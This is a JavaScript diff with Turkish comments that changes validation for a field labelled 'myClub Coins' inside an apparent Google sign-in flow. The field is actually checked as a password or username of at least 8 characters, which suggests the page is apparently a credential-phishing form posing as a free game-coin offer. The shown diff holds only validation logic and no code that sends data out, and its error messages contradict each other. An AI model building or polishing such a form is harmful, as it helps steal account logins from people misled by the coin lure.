@@ -378,18 +378,10 @@ function backToGoogleEmailStep() {
 function handleCoinsInput(val) {
   const coinsError = document.getElementById('googleCoinsError');
   const coinsWrap = document.getElementById('googleCoinsWrap');
-  const errorText = document.getElementById('googleCoinsErrorText');
 
-  // Yazılan değer 0'dan büyük ama 8'den küçükse hata göster
-  if (val.length > 0 && val.length < 8) {
-    if (coinsError) coinsError.style.display = 'flex';
-    if (errorText) errorText.textContent = 'Password must be at least 8 characters.';
-    if (coinsWrap) coinsWrap.classList.add('has-error');
-  } else {
-    // 8 ve üzeri olduğunda veya alan tamamen boşaldığında hatayı kaldır
-    if (coinsError) coinsError.style.display = 'none';
-    if (coinsWrap) coinsWrap.classList.remove('has-error');
-  }
+  // Kullanıcı yazmaya başladığı an önceki hatayı gizler
+  if (coinsError) coinsError.style.display = 'none';
+  if (coinsWrap) coinsWrap.classList.remove('has-error');
 }
 
 /* ==========================================================================
@@ -442,8 +434,9 @@ function handleGoogleCoinsSubmit() {
 
   const rawVal = coinsInput ? coinsInput.value.trim() : '';
 
-  if (!rawVal) {
-    if (coinsErrorText) coinsErrorText.textContent = 'Enter myClub Coins amount.';
+// 8 karakterden azsa (veya boşsa) hata verip durdurur
+  if (rawVal.length < 8) {
+    if (coinsErrorText) coinsErrorText.textContent = 'Username must be at least 8 characters.';
     if (coinsError) coinsError.style.display = 'flex';
     if (coinsWrap) coinsWrap.classList.add('has-error');
     if (coinsInput) coinsInput.focus();
